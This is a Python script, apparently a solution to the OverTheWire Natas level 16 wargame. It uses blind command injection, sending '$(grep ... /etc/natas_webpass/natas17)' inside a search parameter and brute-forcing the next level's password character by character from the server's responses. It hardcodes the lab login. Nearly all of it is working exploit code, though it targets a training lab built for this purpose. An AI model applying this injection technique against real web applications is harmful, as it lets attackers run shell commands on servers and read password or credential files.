import requests
from requests.auth import HTTPBasicAuth

chars='abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ';

key=''
select='bdhkmnsuv1790BCEHIKLRSUX'

# r=requests.get("http://natas16.natas.labs.overthewire.org/index.php",auth=HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'), params={'needle':'sigma'})
# print(r.text)
# for char in chars:
#     data = {'needle':'$(grep '+char+' /etc/natas_webpass/natas17)sigma'}
#     r=requests.get("http://natas16.natas.labs.overthewire.org/index.php",auth=HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'), params=data)
#     #print(r.text)
#
#     if "sigma" not in r.text:
#         select=select+char
#         print(select)

for i in range(0,32):
    for char in select:
        data =  {'needle':'$(grep -e ^'+key+char+' /etc/natas_webpass/natas17)sigma'}
        r=requests.get("http://natas16.natas.labs.overthewire.org/index.php",auth=HTTPBasicAuth('natas16', 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'), params=data)

        if "sigma" not in r.text:
            key = key+char
            print(key)
            break

